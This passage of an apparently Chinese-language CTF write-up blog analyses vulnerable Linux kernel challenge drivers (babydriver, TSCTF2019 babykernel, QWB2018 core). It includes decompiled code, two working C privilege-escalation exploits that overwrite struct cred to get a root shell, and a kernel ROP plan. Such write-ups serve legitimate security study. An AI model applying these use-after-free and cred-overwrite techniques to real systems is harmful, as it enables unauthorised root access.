v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ioctl是最简单的和设备通信的方式，开发者可以在其中根据arg参数决定对设备不同的操作，这里注意command需要是一个唯一的数字，否则可能会进行其他未知的操作，在新的标准里command是有结构的，不同的位有不同功能，这里也不深究了，如果command是0x10001，则释放device_buf，再分配一个指定size的内存地址赋给device_buf。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="keyword">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">"alloc done\n"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB);</span><br><span class="line">    result = <span class="number">-22L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>release函数调用发生在关闭设备文件的时候，这里会free掉buf</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);             <span class="comment">// exec when close(fd)</span></span><br><span class="line">  printk(<span class="string">"device release\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里的漏洞出现在驱动没有处理好并发，在驱动开发的时候，驱动必须是可重入的，也就是说必须是可以支持被多次打开的，这里release的kfree之后没有清空全局变量babydev_struct.device_buf，全局变量在两次打开设备文件的时候是共享的，也就是说如果我们两次打开设备，在第一次free掉buf，在第二次仍能继续读写数据。</p>
<p>最简单的利用方式是阅读该版本的linux源码，获取struct cred的大小(这里是0xa8)，在第一个设备操作中关闭文件free掉buf，再fork一个新的进程，每次fork的时候会分配一个struct cred结构体来标明进程的权限，这个结构体会将父进程的cred复制过来，分配到的恰好是我们分配的结构体(slab分配器类似fastbin的分配方式)，这时候我们在父进程里通过write修改全局变量的device_buf，实际上是修改cred，我们把uid改为0即可在子进程提权，之后在其中打开shell即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we're permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h4><p>exp拿c写，cred的前28个字节改为0即可，exp如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>,<span class="number">2</span>);</span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0xa8</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">char</span> zeros[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2,zeros,<span class="keyword">sizeof</span>(zeros));</span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="TSCTF2019-gt-babykernel"><a href="#TSCTF2019-gt-babykernel" class="headerlink" title="TSCTF2019-&gt;babykernel"></a>TSCTF2019-&gt;babykernel</h3><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>比赛的时候没做出来，半年之后过来考古233.</p>
<p>ioctl有几个功能：</p>
<ol>
<li>cmd=<code>0x22B8</code>，往<code>BUY_LIST[arg3]</code>赋值0x123456789ABCDEF0LL</li>
<li>cmd=<code>0x271A</code>，固定分配<code>0xd0</code>的obj到<code>BUY_LIST[arg3]</code>并执行<code>*(_QWORD *)(BUY_LIST[arg33] + 8) = 0LL;</code>等赋值命令</li>
<li>cmd=<code>0x2766</code>，释放<code>BUY_LIST[arg3]</code>，这里有double free</li>
<li>cmd=<code>0x1A0A</code>，同1一样赋值<code>BUY_LIST[arg3]</code>为0xFEDCBA987654321LL</li>
</ol>
<p>漏洞到这里已经很清楚了，bss上的全局变量释放后未清空，保护有<code>smap</code>和<code>smep</code>，调试可以看到(源码也可以直接看)cred大小恰为0xd0，所以我们释放一个obj，随后fork进程复用这个obj，在主进程再次释放此obj随即alloc到它，之前的*(obj+8)可以将uid位清零，子进程的权限提升为root。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">tshop_ioctl</span><span class="params">(__int64 arg1, <span class="keyword">unsigned</span> <span class="keyword">int</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">int</span> arg3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// si</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v9; <span class="comment">// rdi</span></span><br><span class="line">  _QWORD *v11; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v12; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = (<span class="keyword">signed</span> <span class="keyword">int</span>)arg3;</span><br><span class="line">  <span class="keyword">if</span> ( arg2 == <span class="number">0x22B8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( arg3 &lt;= <span class="number">0xFF</span> &amp;&amp; (v12 = (_QWORD *)BUY_LIST[arg3]) != <span class="number">0L</span>L )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="string">"&lt;1&gt;[*] This Zege is yours!"</span>;</span><br><span class="line">      *v12 = <span class="number">0x123456789ABCDEF0</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="string">"&lt;1&gt;[*] Zege would not like you!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( arg2 &gt; <span class="number">0x22B8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( arg2 == <span class="number">0x271A</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( arg3 &lt;= <span class="number">0xFF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = (_QWORD *)kmem_cache_alloc(zegeorjige, <span class="number">0xD0</span>LL);</span><br><span class="line">        BUY_LIST[v3] = (__int64)v4;</span><br><span class="line">        *v4 = <span class="number">0L</span>L;</span><br><span class="line">        v5 = zegeandjigedesc;</span><br><span class="line">        *(_QWORD *)(BUY_LIST[v3] + <span class="number">8</span>) = <span class="number">0L</span>L;</span><br><span class="line">        *(_QWORD *)(BUY_LIST[v3] + <span class="number">16</span>) = <span class="number">64L</span>L;</span><br><span class="line">        *(_QWORD *)(BUY_LIST[v3] + <span class="number">24</span>) = <span class="number">0x29AA</span>LL;</span><br><span class="line">        v6 = <span class="number">0L</span>L;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = v5[v6];</span><br><span class="line">          v8 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v6++;</span><br><span class="line">          *(_BYTE *)(BUY_LIST[v3] + v8 + <span class="number">0x20</span>) = v7;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v6 != <span class="number">0x21</span> );</span><br><span class="line">        v9 = <span class="string">"&lt;1&gt;[*] Money fly\n"</span>;</span><br><span class="line">        *(_BYTE *)(BUY_LIST[v3] + <span class="number">0x41</span>) = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( arg2 != <span class="number">0x2766</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">      <span class="keyword">if</span> ( arg3 &lt;= <span class="number">0xFF</span> &amp;&amp; BUY_LIST[arg3] )</span><br><span class="line">      &#123;</span><br><span class="line">        kfree();</span><br><span class="line">        v9 = <span class="string">"&lt;1&gt;[*] Say goodbye to flag\n"</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = <span class="string">"&lt;1&gt;[*] Zege and Jige would not like you!"</span>;</span><br><span class="line">LABEL_16:</span><br><span class="line">    printk(v9);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( arg2 == <span class="number">0x1A0A</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( arg3 &lt;= <span class="number">0xFF</span> &amp;&amp; (v11 = (_QWORD *)BUY_LIST[arg3]) != <span class="number">0L</span>L )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="string">"&lt;1&gt;[*] This Jige is yours!"</span>;</span><br><span class="line">      *v11 = <span class="number">0xFEDCBA987654321</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="string">"&lt;1&gt;[*] Jige would not like you!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="exp-c"><a href="#exp-c" class="headerlink" title="exp.c"></a>exp.c</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MallocCmd 0x271a</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FreeCmd 0x2766</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Malloc</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd,MallocCmd,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Free</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd,FreeCmd,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/tshop"</span>,<span class="number">2</span>);</span><br><span class="line">    Malloc(fd,<span class="number">0</span>);</span><br><span class="line">    Malloc(fd,<span class="number">1</span>);</span><br><span class="line">    Free(fd,<span class="number">0</span>);</span><br><span class="line">    Free(fd,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> pid = fork();<span class="comment">//now we alloc cred using obj1</span></span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(getuid() != <span class="number">0</span>)&#123;</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">"id"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        Free(fd,<span class="number">1</span>);<span class="comment">//now we free cred</span></span><br><span class="line">        Malloc(fd,<span class="number">2</span>);<span class="comment">//set uid=0</span></span><br><span class="line">        <span class="comment">//wait(NULL);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Kernel-ROP"><a href="#Kernel-ROP" class="headerlink" title="Kernel ROP"></a>Kernel ROP</h2><h3 id="QWB2018-Core"><a href="#QWB2018-Core" class="headerlink" title="QWB2018-Core"></a>QWB2018-Core</h3><h4 id="寻找rops"><a href="#寻找rops" class="headerlink" title="寻找rops"></a>寻找rops</h4><p>vmlinux是未经压缩的二进制文件，可以使用<code>ropper --file ./vmlinux &gt; rops</code>将寻找的rop存放起来，如果题目没有给vmlinux可以拿<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener">extract-vmlinux</a>进行提取<code>./extract-vmlinux ./bzImage &gt; ./vmlinux</code></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>查看启动脚本，发现开了<code>kaslr</code>保护，解压cpio文件<code>cpio -idm &lt; ./core.cpio</code>，文件夹下有系统的初始化脚本init，其内容为。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'sh end!\n'</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p>前面实在创建设备驱动，挂载设备，之后将kallsyms的内容拷贝到/tmp/kallsyms文件中，<code>kptr_restrict</code>为1表示root用户可以读取内核符号地址而普通用户不能。同理<code>dmesg_restrict</code>为1表示root用户可以查看dmesg信息而普通用户不能。</p>
<p>后面是设置网卡和路由信息，启动了一个uid为1000的普通用户所在的shell，poweroff这行是设置120s定时关机，我们为了避免干扰做题先注释掉，同样为了之后能看text段的基址我们把uid改成0，即root用户。</p>
<p>最后的insmod插入了一个内核模块<code>core.ko</code>，这个就是本题的漏洞模块，我们等会来分析它。现在把文件系统重新打包(文件系统中有个打包脚本，参数为打包的压缩文件名，打包之后拷到上层目录即可)</p>
<p>下面分析core.ko</p>
<p>在ioctl函数里实现了几种功能，其中arg1表示choice，arg2为参数2。</p>
<ol>
<li>arg1=0x6677889B时，调用core_read(arg2)，从v4[off]拷贝0x40长度的数据到arg2指定的用户地址，这里off是一个全局变量</li>
<li>arg1=0x6677889C，将arg2赋值给off(结合1和2我们可以泄露栈上数据)</li>
<li>arg1=0x6677889A，调用core_copy_func，arg2指定size，拷贝arg2长度的数据从name到栈局部变量v1，这里检查了size要小于等于0x3f，但是qememcpy用的类型是int16，因此我们传入一个负数即可绕过检查(因为size指定，这里可以栈溢出)</li>
<li>core_write函数把用户空间的数据拷贝到bss的全局变量name上，size也是用户指定的长度</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">core_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> arg1, __int64 arg2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( arg1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(arg2);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(<span class="string">"\x016core: %d\n"</span>);</span><br><span class="line">      off = arg2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(<span class="string">"\x016core: called core_copy\n"</span>);</span><br><span class="line">      core_copy_func(arg2);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">core_read</span><span class="params">(__int64 user_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 user_addr1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  user_addr1 = user_addr;</span><br><span class="line">  v5 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">"\x016core: called core_read\n"</span>);</span><br><span class="line">  printk(<span class="string">"\x016%d %p\n"</span>);</span><br><span class="line">  v2 = v4;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16L</span>L; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">"Welcome to the QWB CTF challenge.\n"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_to_user(user_addr1, &amp;v4[off], <span class="number">64L</span>L) )</span><br><span class="line">    __asm &#123; swapgs &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">core_copy_func</span><span class="params">(<span class="keyword">signed</span> __int64 size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">"\x016core: called core_writen"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x3F</span> )</span><br><span class="line">    printk(<span class="string">"\x016Detect Overflow"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    qmemcpy(v1, name, (<span class="keyword">unsigned</span> __int16)size);  <span class="comment">// overflow</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">core_write</span><span class="params">(__int64 a1, __int64 user_addr, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  size = a3;</span><br><span class="line">  printk(<span class="string">"\x016core: called core_writen"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(name, user_addr, size) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size;</span><br><span class="line">  printk(<span class="string">"\x016core: error copying data from userspacen"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>我们现在有地址泄露和栈溢出，用到的就是这里讲到的kernel rop，思路如下：</p>
<ol>
<li>利用ioctl结合core_read泄露地址及canary</li>
<li>利用core_write吧gadgets写到name上</li>
<li>利用copy_func将gadgets写到栈上</li>
<li>通过rop执行<code>commit_creds(prepare_kernel_cred(0))</code></li>
<li>返回用户态，执行system(“/bin/sh”)起shell(使用<code>swapgs;iretq</code>来进行切换，但最开始要使用<code>save_status</code>保存寄存器的状态)</li>
</ol>
